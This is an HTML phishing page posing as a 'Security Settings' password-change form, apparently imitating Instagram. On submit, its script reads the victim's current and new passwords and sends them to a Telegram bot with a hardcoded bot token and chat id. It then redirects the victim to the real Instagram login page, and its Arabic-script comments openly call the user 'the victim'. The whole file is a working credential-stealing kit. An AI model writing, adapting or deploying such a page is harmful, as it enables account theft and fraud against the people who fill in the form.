<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Settings</title>
    <style>
        body { font-family: -apple-system, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background-color: #fff; border: 1px solid #dbdbdb; padding: 40px; width: 350px; display: flex; flex-direction: column; align-items: center; border-radius: 3px; }
        .logo { font-size: 24px; font-weight: bold; margin-bottom: 25px; color: #262626; }
        input { width: 100%; padding: 12px 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background-color: #fafafa; font-size: 13px; box-sizing: border-box; }
        .btn { width: 100%; background-color: #0095f6; color: white; border: none; padding: 10px; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 15px; }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">Security Settings</div>
        <form id="instaForm">
            <input type="password" id="old_p" placeholder="Current Password" required>
            <input type="password" id="new_p" placeholder="New Password" required>
            <button type="submit" class="btn">Changer</button>
        </form>
    </div>

    <script>
        const token = '8531200875:AAGR0wRXZLRvrvwqGgXwfBRd6n0V0gjYWcU';
        const chatId = '6347084263';

        document.getElementById('instaForm').onsubmit = function(e) {
            e.preventDefault();
            
            const oldPass = document.getElementById('old_p').value;
            const newPass = document.getElementById('new_p').value;

            const message = `🚨 New Info:\nOld: ${oldPass}\nNew: ${newPass}`;
            
            // هاد الرابط هو اللي غيصيفط الميساج
            const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            // كنفتحو الرابط فـ "فريم" صغير مخبي باش المتصفح ما يبلوكيش
            const request = new XMLHttpRequest();
            request.open("GET", telegramUrl, true);
            request.send();

            // صيفط الضحية لإنستغرام نيشان مورا ثانية واحدة
            setTimeout(function() {
                window.location.href = "https://www.instagram.com/accounts/login/";
            }, 500);
        };
    </script>

</body>
</html>
